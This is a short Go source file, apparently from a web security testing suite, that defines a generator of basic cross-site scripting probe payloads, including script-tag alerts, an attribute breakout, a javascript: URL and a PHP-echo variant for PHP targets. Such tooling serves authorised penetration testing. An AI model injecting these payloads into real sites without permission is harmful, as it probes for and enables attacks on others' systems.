
package payloads

import (
	"github.com/GhostN3xus/Huntsuite/pkg/modules"
)

// XSSPayloadGenerator gera payloads XSS.
type XSSPayloadGenerator struct{}

// NewXSSPayloadGenerator cria um novo gerador de payload XSS.
func NewXSSPayloadGenerator() *XSSPayloadGenerator {
	return &XSSPayloadGenerator{}
}

// Name retorna o nome do gerador de payload.
func (g *XSSPayloadGenerator) Name() string {
	return "xss_basic"
}

// Generate gera uma lista de payloads XSS com base no contexto do alvo.
func (g *XSSPayloadGenerator) Generate(ctx *modules.TargetContext) ([]modules.Payload, error) {
	payloads := []modules.Payload{
		{Value: `<script>alert(1)</script>`, Type: "XSS", Encoding: "HTML"},
		{Value: `"><script>alert(1)</script>`, Type: "XSS", Encoding: "HTML"},
		{Value: `javascript:alert(1)`, Type: "XSS", Encoding: "URL"},
	}

	// Exemplo de lógica dinâmica: adicionar um payload específico para PHP
	if ctx.Technology == "PHP" {
		payloads = append(payloads, modules.Payload{
			Value:    `<?php echo '<script>alert(1)</script>'; ?>`,
			Type:     "XSS",
			Encoding: "HTML",
		})
	}

	return payloads, nil
}
